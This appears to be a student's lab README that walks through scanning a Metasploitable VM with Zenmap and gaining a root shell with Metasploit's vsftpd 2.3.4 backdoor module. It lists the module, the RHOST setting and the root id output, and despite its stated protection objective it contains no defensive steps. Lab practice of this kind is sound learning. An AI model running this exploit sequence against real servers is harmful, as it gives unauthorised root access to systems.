# server-side-protection

## Objective

Server side vulnerabilities and finding ways to protect them

### Skills Learned

- Installing Metasploitable on a Mac (silicon)

  

### Tools Used

- Metasploitable
- Zenmap
- metasploit
  

### Steps for Server side vulnerabilities 

- Install Metasploitable in a silicon Mac (M1, M2, M3) using UTM https://www.youtube.com/watch?v=E3IJ_d3rAgA
- msfadmin is the user and password for Metasploitable
- We can scan the IP of the Metasploitable via Zenmap using Intense scan to check what services are open and installed
- We can see the Port/Hosts

<img width="726" alt="image" src="https://github.com/user-attachments/assets/a659b4ae-d059-4454-a76e-27e033a8b3f4" />

- We can use metasploit to check for vulnerabilities and explore them
- To enter the metasploit console we just type **msfconsole**
  
<img width="795" alt="image" src="https://github.com/user-attachments/assets/07fbc7f6-ba7d-4658-8cc1-2fc60589193a" />

-  We search for VSFTPD v2.3.4 exploit online and find the module name
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
- We can now enter the exploit. We can type **show options** to see what options there is
- We can now change the RHOST to the Metasploitable IP
```bash
set RHOST <IP of Metasploitable>
```

- We can use show options to check the changes
- We then type **exploit** to enter the exploit, we should see command shell session 1 opened
- We can use Linux commands now

```bash
id
uid=0(root) gid=0(root)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
- id to see that we are root, the uname is to see our name.
- Any exploit we do use <the exploit> then we show options so we know what we can change

